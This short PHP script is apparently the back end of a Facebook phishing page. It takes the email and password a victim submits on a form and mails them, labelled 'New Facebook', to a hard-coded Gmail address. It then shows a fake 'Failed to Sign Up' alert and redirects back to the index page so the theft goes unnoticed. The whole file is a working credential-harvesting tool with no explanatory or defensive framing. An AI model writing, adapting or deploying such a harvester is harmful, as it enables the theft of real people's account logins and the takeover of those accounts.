<?php
$to = "pressex78@gmail.com";
$from = "user@gmail.com";
$detailem = $_POST["email"];
$detailpass = $_POST["password"];
$sender = "From:".$from;
$content = 'New Facebook'.$detailem.$detailpass;
mail($to, $content, $sender);

echo '<script>alert("Failed to Sign Up...")</script>';
header("refresh:0;url=index.html");


exit();
?>